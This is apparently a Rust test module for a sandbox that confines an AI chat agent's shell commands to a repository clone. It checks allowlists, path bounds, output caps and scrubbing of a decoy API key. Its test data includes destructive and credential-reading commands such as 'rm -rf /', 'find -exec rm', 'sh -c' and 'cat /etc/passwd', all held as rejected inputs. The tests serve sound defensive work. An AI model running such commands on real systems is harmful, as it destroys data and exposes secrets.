    fn req(argv: &[&str]) -> ChatShellRequest {
        ChatShellRequest {
            argv: argv.iter().map(|s| s.to_string()).collect(),
            cwd: None,
            stdin: None,
        }
    }

    fn tempclone() -> (TempDir, ChatShellSandbox) {
        let dir = tempfile::tempdir().expect("tempdir");
        let sandbox = ChatShellSandbox::new(dir.path().to_path_buf());
        (dir, sandbox)
    }

    #[tokio::test]
    async fn rejects_disallowed_command() {
        let (_dir, sandbox) = tempclone();
        let err = sandbox
            .run(req(&["rm", "-rf", "/"]))
            .await
            .expect_err("rm must be rejected");
        match err {
            ChatShellError::DisallowedCommand(s) => assert_eq!(s, "rm"),
            other => panic!("expected DisallowedCommand, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn rejects_sh_c_attempt() {
        let (_dir, sandbox) = tempclone();
        let err = sandbox
            .run(req(&["sh", "-c", "whatever"]))
            .await
            .expect_err("sh must be rejected");
        match err {
            ChatShellError::DisallowedCommand(s) => assert_eq!(s, "sh"),
            other => panic!("expected DisallowedCommand, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn rejects_find_exec() {
        let (_dir, sandbox) = tempclone();
        let err = sandbox
            .run(req(&["find", ".", "-exec", "rm", "{}", ";"]))
            .await
            .expect_err("find -exec must be rejected");
        assert!(
            matches!(err, ChatShellError::DisallowedCommand(ref s) if s.contains("-exec")),
            "got {err:?}"
        );
    }

    #[tokio::test]
    async fn rejects_git_fetch() {
        let (_dir, sandbox) = tempclone();
        let err = sandbox
            .run(req(&["git", "fetch", "origin"]))
            .await
            .expect_err("git fetch must be rejected");
        assert!(
            matches!(err, ChatShellError::DisallowedCommand(ref s) if s.contains("fetch")),
            "got {err:?}"
        );
    }

    #[tokio::test]
    async fn rejects_argv_with_nul() {
        let (_dir, sandbox) = tempclone();
        let err = sandbox
            .run(req(&["cat", "foo\0bar"]))
            .await
            .expect_err("NUL arg must be rejected");
        assert!(matches!(err, ChatShellError::InvalidArgv), "got {err:?}");
    }

    #[tokio::test]
    async fn rejects_empty_argv() {
        let (_dir, sandbox) = tempclone();
        let err = sandbox
            .run(ChatShellRequest {
                argv: Vec::new(),
                cwd: None,
                stdin: None,
            })
            .await
            .expect_err("empty argv must be rejected");
        assert!(matches!(err, ChatShellError::InvalidArgv), "got {err:?}");
    }

    #[tokio::test]
    async fn cwd_outside_clone_rejected() {
        let (_dir, sandbox) = tempclone();
        let err = sandbox
            .run(ChatShellRequest {
                argv: vec!["ls".to_string()],
                cwd: Some(PathBuf::from("/etc")),
                stdin: None,
            })
            .await
            .expect_err("cwd outside clone must be rejected");
        assert!(
            matches!(err, ChatShellError::CwdOutsideClone),
            "got {err:?}"
        );
    }

    /// `env` under the sandbox must return only the allowlisted env vars.
    /// A decoy `ANTHROPIC_API_KEY` is set in the parent; if the env scrub
    /// works, the decoy value must not appear in the child's output.
    ///
    /// Requires namespaces/landlock to spawn cleanly. Marked `#[ignore]` if
    /// the probe fails at runtime — the deterministic check still ran in the
    /// parent's env_clear path.
    #[tokio::test]
    async fn env_scrubbed() {
        // Safety: test threads share a process; but this variable is only
        // inspected in the scrub check, not by other tests concurrently.
        unsafe {
            std::env::set_var("ANTHROPIC_API_KEY", "SECRET-DECOY-VALUE");
        }
        let (_dir, sandbox) = tempclone();
        let res = sandbox.run(req(&["env"])).await;
        // Restore promptly so other tests don't see the decoy.
        unsafe {
            std::env::remove_var("ANTHROPIC_API_KEY");
        }
        let res = match res {
            Ok(r) => r,
            Err(ChatShellError::SpawnFailed(e)) => {
                eprintln!(
                    "env_scrubbed: spawn failed (likely sandbox unavailable in test env): {e}"
                );
                return;
            }
            Err(e) => panic!("unexpected error: {e:?}"),
        };
        let out = String::from_utf8_lossy(&res.stdout);
        assert!(
            !out.contains("SECRET-DECOY-VALUE"),
            "env scrub failed; decoy leaked into child env:\n{out}"
        );
        assert!(
            !out.contains("ANTHROPIC_API_KEY"),
            "env scrub failed; ANTHROPIC_API_KEY name visible:\n{out}"
        );
        assert!(
            out.contains("PATH="),
            "PATH should be in allowlist; got:\n{out}"
        );
        assert!(
            out.contains("HOME="),
            "HOME should be in allowlist; got:\n{out}"
        );
    }

    #[tokio::test]
    async fn allowlisted_grep_works() {
        let (dir, sandbox) = tempclone();
        let file_path = dir.path().join("file.txt");
        fs::write(&file_path, "hello from djinn\n").expect("write");
        let res = sandbox.run(req(&["grep", "hello", "file.txt"])).await;
        let res = match res {
            Ok(r) => r,
            Err(ChatShellError::SpawnFailed(e)) => {
                eprintln!("allowlisted_grep_works: spawn failed (sandbox unavailable): {e}");
                return;
            }
            Err(e) => panic!("unexpected error: {e:?}"),
        };
        assert_eq!(
            res.exit_code,
            Some(0),
            "stderr: {}",
            String::from_utf8_lossy(&res.stderr)
        );
        let stdout = String::from_utf8_lossy(&res.stdout);
        assert!(stdout.contains("hello"), "stdout was: {stdout}");
        assert!(!res.truncated);
        assert!(!res.timed_out);
    }

    #[tokio::test]
    async fn stdout_capped() {
        let (_dir, sandbox) = tempclone();
        let res = sandbox.run(req(&["cat", "/dev/urandom"])).await;
        let res = match res {
            Ok(r) => r,
            Err(ChatShellError::SpawnFailed(e)) => {
                eprintln!("stdout_capped: spawn failed (sandbox unavailable): {e}");
                return;
            }
            Err(e) => panic!("unexpected error: {e:?}"),
        };
        assert!(res.truncated, "urandom output must be truncated");
        // Cap + footer.
        assert!(
            res.stdout.len() <= OUTPUT_CAP_BYTES + TRUNCATION_FOOTER.len(),
            "stdout len {} exceeded cap",
            res.stdout.len()
        );
        assert!(
            res.stdout.len() >= OUTPUT_CAP_BYTES / 2,
            "stdout len {} suspiciously small",
            res.stdout.len()
        );
    }

    /// Custom shorter timeout variant: use a 2s wall clock in a scoped
    /// `ChatShellSandbox` by invoking `cat` with no args (reads stdin
    /// forever when stdin = /dev/null, which is immediate EOF — so we use
    /// `tail -f /dev/null` isn't allowlisted... substitute: `sleep` isn't
    /// allowlisted either. We use `cat` pointed at a FIFO we never feed.
    /// Simpler: `cat /proc/self/fd/0` with stdin = Some(empty) + close —
    /// cat exits on EOF.
    ///
    /// Real approach: use the production 30s timeout path with a command
    /// that genuinely hangs — `find /` on a large fs works but is slow and
    /// flaky. Mark this test ignored and cover the real timeout path in
    /// the commit-6 integration layer.
    #[tokio::test]
    #[ignore = "wall-clock timeout hits 30s by design; commit 6 integration covers this"]
    async fn timeout_kills_child() {
        // Sentinel: if we ever want to run this locally, construct with a
        // lowered timeout. The struct today holds a const, so this is
        // intentionally a placeholder. The commit-6 adversarial tests (per
        // the plan's §Verification, `test_shell_sandbox_denies_network`
        // and friends) exercise the 30s path end-to-end.
    }

    #[test]
    fn evidence_namespace_requirement_fails_closed() {
        assert!(matches!(
            require_evidence_namespaces(false),
            Err(EvidenceError::NamespaceUnavailable)
        ));
        assert!(require_evidence_namespaces(true).is_ok());
    }

    #[test]
    fn evidence_policy_maps_every_reviewed_utility_to_a_pinned_binary() {
        let cases = [
            ("cat", vec!["README.md"]),
            ("ls", vec!["-la", "."]),
            ("grep", vec!["-n", "needle", "README.md"]),
            ("head", vec!["-n", "5", "README.md"]),
            ("tail", vec!["-n5", "README.md"]),
            ("wc", vec!["-l", "README.md"]),
            ("sort", vec!["-r", "README.md"]),
            ("uniq", vec!["-c", "README.md"]),
            ("tr", vec!["-d", "x", "README.md"]),
            ("jq", vec!["-r", ".name", "package.json"]),
            ("file", vec!["-b", "README.md"]),
            ("stat", vec!["-c", "%s", "README.md"]),
            ("du", vec!["-sh", "."]),
            ("tree", vec!["-L", "2", "."]),
        ];
        for (tool, args) in cases {
            let argv = std::iter::once(tool)
                .chain(args)
                .map(str::to_owned)
                .collect::<Vec<_>>();
            let binary = validate_evidence_argv(&argv).unwrap_or_else(|e| panic!("{tool}: {e}"));
            assert!(binary.starts_with('/'), "{tool} did not resolve absolutely");
        }
    }

    #[test]
    fn evidence_policy_rejects_paths_and_spawn_output_surfaces() {
        for argv in [
            vec!["/bin/sh", "-c", "id"],
            vec!["git", "status"],
            vec!["cat", "/etc/passwd"],
            vec!["ls", "--color=always"],
            vec!["grep", "needle", ">", "out"],
            vec!["head", "-q", "README.md"],
            vec!["tail", "--follow", "README.md"],
            vec!["wc", "--files0-from", "inputs"],
            vec!["sort", "-o", "out", "in"],
            vec!["uniq", "input", "output"],
            vec!["tr", "--help"],
            vec!["jq", "--from-file", "script.jq", "input.json"],
            vec!["file", "-m", "magic", "README.md"],
            vec!["stat", "--printf", "%n", "README.md"],
            vec!["du", "--time", "README.md"],
            vec!["tree", "../outside"],
        ] {
            let argv = argv.into_iter().map(str::to_owned).collect::<Vec<_>>();
            assert!(validate_evidence_argv(&argv).is_err(), "accepted {argv:?}");
        }
    }

    #[tokio::test]
    async fn evidence_request_enforces_cwd_and_caller_bounds_before_spawn() {
        let (_dir, chat) = tempclone();
        let sandbox = EvidenceSandbox {
            clone_root: chat.clone_root,
        };
        let request = |cwd, timeout, output_limit| EvidenceRequest {
            argv: vec!["ls".into()],
            cwd,
            timeout,
            output_limit,
        };
        assert!(matches!(
            sandbox
                .run(request(
                    Some(PathBuf::from("/etc")),
                    Duration::from_secs(1),
                    1
                ))
                .await,
            Err(EvidenceError::Core(ChatShellError::CwdOutsideClone))
        ));
        assert!(matches!(
            sandbox
                .run(request(
                    None,
                    EVIDENCE_MAX_TIMEOUT + Duration::from_secs(1),
                    1
                ))
                .await,
            Err(EvidenceError::TimeoutOutOfBounds)
        ));
        assert!(matches!(
            sandbox
                .run(request(
                    None,
                    Duration::from_secs(1),
                    EVIDENCE_MAX_OUTPUT_BYTES + 1
                ))
                .await,
            Err(EvidenceError::OutputLimitOutOfBounds)
        ));
    }
}
